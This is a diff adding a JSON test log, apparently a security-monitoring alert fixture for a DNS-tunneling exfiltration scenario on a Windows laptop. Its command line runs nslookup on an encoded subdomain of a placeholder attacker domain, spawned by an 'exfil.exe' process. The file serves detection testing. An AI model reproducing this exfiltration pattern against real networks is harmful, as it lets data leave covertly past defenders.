@@ -1,0 +1,31 @@
+{
+  "timestamp": "2025-08-19T18:48:53.658251Z",
+  "rule": {
+    "id": 61604,
+    "level": 8,
+    "description": "Test log for exf_01_dns_tunneling",
+    "groups": [
+      "test",
+      "windows"
+    ]
+  },
+  "agent": {
+    "id": "003",
+    "name": "WIN-LAPTOP01",
+    "ip": "192.168.1.150"
+  },
+  "win": {
+    "system": {
+      "eventID": "1",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "computer": "WIN-LAPTOP01"
+    },
+    "eventdata": {
+      "commandLine": "nslookup c3NzaXRpdmVkYXRh.c2.evil.com",
+      "image": "C:\\Windows\\System32\\nslookup.exe",
+      "parentImage": "C:\\temp\\exfil.exe"
+    }
+  },
+  "location": "EventChannel",
+  "full_log": "Test log entry for exf_01_dns_tunneling scenario"
+}
